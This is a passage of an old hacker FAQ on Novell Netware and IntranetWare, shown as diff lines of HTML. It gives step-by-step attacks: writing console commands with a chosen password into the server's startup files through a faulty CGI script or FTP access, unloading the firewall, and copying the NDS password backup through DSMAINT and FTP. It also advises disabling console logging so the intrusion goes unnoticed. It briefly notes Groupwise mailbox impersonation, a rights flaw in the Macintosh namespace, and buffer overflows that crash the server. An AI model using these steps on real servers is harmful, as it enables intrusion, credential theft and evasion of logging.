+something, it seems that installed out of the box 4.1 is vulnerable. I am unsure if 4.11 is affected, but my guess is yes. The problem? If NFS file space
+isn't used, certain clients like Fetch and Cute FTP will end up with Supe rights to the volume. 
+<P>
+<H2><A NAME="ss24.26">24.26 Can an IntranetWare server be compromised from the Internet?</A>
+</H2>
+
+<P>This is a tricky question, however it is POSSIBLE. I've been working on the right set of conditions in the lab, and I have got it to happen. However it
+involves a LOT of conditions. But these conditions are not entirely out of the question. 
+<P>First, variations on the answers outlined in the previous two questions could be used to gain initial access. For example, if a poorly constructed CGI script
+was put in place that allowed write access to the server and could be redirected, additions could be added to NCF files. 
+<P>For example, imagine that a CGI script is in place to add a line of text to a file, such as a mailing list. If this CGI script could be redirected, adding a few
+lines to SYS:ETC\LDREMOTE.NCF or SYS:SYSTEM\AUTOEXEC.NCF could give you complete access. Such lines might include: 
+<P>
+<PRE>
+        UNLOAD REMOTE
+        LOAD REMOTE HACKPASSWORD
+        LOAD XCONSOLE
+</PRE>
+<P>Now simply telnetting to the server, using "hackpassword", and choosing VT-100 will give you remote console access after the next reboot. 
+<P>Can't telnet past that NLM-based firewall? Add the commands to the NCF file to simply unload it! You can reload it after you've gained access, if you
+desire. 
+<P>Access via Novell's FTP NLM is another problem. If you can gain access to the server via FTP and get read/write access to the SYS: volume, you can
+alter NCF files and open up all kinds of access. 
+<P>So what kinds of damage can be done? Grab passwords!
+<P>If you have gained access via techniques previously described, you can grab the password file(s). Novell has stated
+publicly it cannot happen, yet I have done it in the NMRC lab. 
+<P>First off, the NDS files are located in the SYS:_NETWARE directory. You would of course have to gain access to these files. And there are a couple
+of ways to do this. You can use the techniques described in the Netware Console Attack section, which will allow all kinds of things. But let's say the administrator of the
+server has removed NETBASIC, and you can't upload a file like JCMD.NLM. You are not entirely sunk. 
+<P>As stated elsewhere in this FAQ, running a BINDFIX on Netware 3.x made a copy of the bindery files in SYS:SYSTEM. To get that 4.11 backup file,
+you need to run the equivalent utility from the console. And it is very simple. 
+<P>
+<OL>
+<LI> If possible, wait until no one is logged in, as it will be noticable.
+During this process no one can log in, although users already logged in
+should be okay.</LI>
+<LI> UNLOAD CONLOG (duh)</LI>
+<LI> LOAD DSMAINT</LI>
+<LI> Choose the option to prepare for an upgrade.</LI>
+<LI> This process creates a complete backup of NDS and the login scripts,
+and puts it in SYS:SYSTEM. The file is called BACKUP.DS. Use the problem
+with FTP.NLM to get it, or simply load up FTP.NLM if it isn't running.</LI>
+</OL>
+<P>
+<H2><A NAME="ss24.27">24.27 Are there any problems with Novell's Groupwise?</A>
+</H2>
+
+<P>There is some concern about the ability to proxy another user's mailbox
+and calendar with Groupwise version 5.2. This attack seems to exclude
+those with admin rights. The hacker is unable to read the user's files,
+but he can send email representing the hacker as the user. NMRC is
+investigating this issue and will be sure to post the results.
+<P>
+<H2><A NAME="ss24.28">24.28 Are there any problems with Netware's Macintosh namespace?</A>
+</H2>
+
+<P>A hacker can make changes to the resource fork files without having modify
+rights. If write rights are removed, the files are secure, but nothing can
+be added to the directory.
+<P>
+<H2><A NAME="ss24.29">24.29 What's the story with buffer overflows on Netware?</A>
+</H2>
+
+<P>Buffer overflows do exist on Netware. Most buffer overflow exploits try to
+get the CPU to execute arbitrary code to gain higher levels of access to a
+system. Even though Novell says Netware NLMs run in protected memory and
+that problems with NLMs should not bother other NLMs, basically all Netware
+buffer overflows simply abend the server. This is the basis for many Denial
+of Service attacks against Netware.
+<P>
+<P>
+<HR>
+<A HREF="hackfaq-25.html">Next</A>
+<A HREF="hackfaq-23.html">Previous</A>
+<A HREF="hackfaq.html#toc24">Contents</A>
+</BODY>
+</HTML>
